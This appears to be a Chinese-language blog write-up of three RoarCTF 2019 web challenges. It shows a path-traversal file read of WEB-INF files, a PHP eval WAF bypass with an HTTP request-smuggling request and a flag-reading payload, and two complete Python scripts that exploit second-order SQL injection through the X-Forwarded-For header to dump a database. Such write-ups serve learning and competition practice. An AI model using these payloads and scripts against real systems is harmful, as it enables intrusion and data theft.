<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        roarctf 2019 - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#roarctf-2019"><span class="toc-text">roarctf 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-java"><span class="toc-text">easy_java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是-WEB-INF"><span class="toc-text">什么是 WEB-INF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-calc"><span class="toc-text">easy_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Online-Proxy"><span class="toc-text">Online Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        roarctf 2019
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-10-16 16:45:49</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#wp" title="wp">wp</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="roarctf-2019"><a href="#roarctf-2019" class="headerlink" title="roarctf 2019"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>
<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p>
<p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p>
<p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p>
<h3 id="什么是-WEB-INF"><a href="#什么是-WEB-INF" class="headerlink" title="什么是 WEB-INF"></a>什么是 WEB-INF</h3><blockquote>
<p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
</blockquote>
<ol>
<li><p>/WEB-INF/web.xml</p>
<p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
</li>
<li><p>/WEB-INF/classes/</p>
<p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p>
</li>
</ol>
<p>其他的配置文件介绍看<a href="https://baike.baidu.com/item/web-inf" title="这里" target="_blank" rel="noopener">https://baike.baidu.com/item/web-inf</a></p>
<p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p>
<p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p>
<p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p>
<h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>右键查看源码</p>
<pre><code>&lt;?php
error_reporting(0);
if(!isset($_GET[&apos;num&apos;])){
    show_source(__FILE__);
}else{
        $str = $_GET[&apos;num&apos;];
        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];
        foreach ($blacklist as $blackitem) {
                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {
                        die(&quot;what are you want to do?&quot;);
                }
        }
        eval(&apos;echo &apos;.$str.&apos;;&apos;);
}
?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p>
<ol>
<li>利用字符串解析特性 Bypass</li>
</ol>
<p>原理看这篇文章：<br><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p>
<p>这是测试php是如何处理特殊字符：</p>
<pre><code>&lt;?php
foreach(
    [
        &quot;{chr}foo_bar&quot;,
        &quot;foo{chr}bar&quot;,
        &quot;foo_bar{chr}&quot;
    ] as $k =&gt; $arg) {
    for($i=0;$i&lt;=255;$i++) {
        echo &quot;\033[999D\033[K\r&quot;;
        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;
        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);
        /* yes... I&apos;ve added a sleep time on each loop just for
        the scenic effect :)
like that movie with unrealistic
        brute-force where the password are obtained
        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
        */
        usleep(5000);
        if(isset($o[&quot;foo_bar&quot;])) {
            echo &quot;\033[999D\033[K\r&quot;;
            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;
        }
    }
    echo &quot;\033[999D\033[K\r&quot;;
    echo &quot;\n&quot;;
}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p>
<ol start="2">
<li>http协议走私攻击</li>
</ol>
<blockquote>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
</blockquote>
<p>这里我们通过 CL-CL 来Bypass</p>
<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1
Host: ********
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: **********
Cookie: __cfduid=***********
X-Forwarded-For: 127.0.0.1
Content-Length: 7
Content-Length: 7
Content-Type: application/x-www-form-urlencoded

num=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p>
<p>先学习几个函数</p>
<ul>
<li>ord — 返回字符的 ASCII 码值</li>
<li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li>
<li>hex2bin — 转换十六进制字符串为二进制字符串</li>
<li>dechex — 十进制转换为十六进制</li>
<li>base_convert — 在任意进制之间转换数字</li>
<li>hexdec — 十六进制转换为十进制</li>
</ul>
<p>读取flag</p>
<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p>
<pre><code>&lt;!-- Debug Info: 
 Duration: 0.058279037475586 s 
 Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p>
<p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p>
<p>查看源码：</p>
<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);
$content = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;&lt;a href=\&quot;/?url=&quot;, $content);
$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);
echo($content);
$end = microtime(true);
$time = $end - $start;
$last_ip = &quot;&quot;;
$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);
if(count($result) &gt; 0) {
    if($ip !== $result[0][&apos;current_ip&apos;]) {
        $last_ip = $result[0][&apos;current_ip&apos;];
        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);
    } else {
        $last_ip = $result[0][&apos;last_ip&apos;];
    }
}
query(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);
die(&quot;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p>
<p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p>
<p>exp:</p>
<pre><code>import requests
from time import sleep
url = &quot;http://node3.buuoj.cn:28063/&quot;
s = requests.session()

re = s.get(url)
name = &apos;&apos;
&quot;&quot;&quot;
# database name
# current db : ctf
# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
&quot;&quot;&quot;
# table name
# ctf : ip_log
# F4l9_D4t4B45e : F4l9_t4b1e
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
&quot;&quot;&quot;
# column_name
# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn
for i in range(1,20):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break
&quot;&quot;&quot;
for i in range(1,100):
    print &apos;[+]: &apos;,i
    for j in range(33,128):
        sleep(0.01)
        headers1 = {
&quot;X-Forwarded-For&quot;: &apos;1&apos;
}
        headers2 = {
    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)
}
        re1 = s.get(url,headers = headers2)
        try:
            re2 = s.get(url,headers=headers1,timeout=2)
        except Exception as e:
            #print &quot;[-]: &quot;+str(e)
            name += chr(j)
            print name
            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p>
<pre><code>#!/usr/bin/env python3

import requests

target = &quot;http://localhost:8302/&quot;

def execute_sql(sql):
    print(&quot;[*]请求语句：&quot; + sql)
    return_result = &quot;&quot;

    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;
    session = requests.session()
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
    start_pos = r.text.find(&quot;Last Ip: &quot;)
    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)
    length = int(r.text[start_pos + 9: end_pos])
    print(&quot;[+]长度：&quot; + str(length))

    for i in range(1, length + 1, 5):
        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;

        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})
        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})
        start_pos = r.text.find(&quot;Last Ip: &quot;)
        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)
        result = int(r.text[start_pos + 9: end_pos])
        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)

        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))

    return return_result


# 获取数据库
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))

# 获取数据库表
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))

# 获取数据库表
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))

# 获取表中内容
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
<p><a href="https://paper.seebug.org/1048/#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/#32-cl-cl</a></p>
</blockquote>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
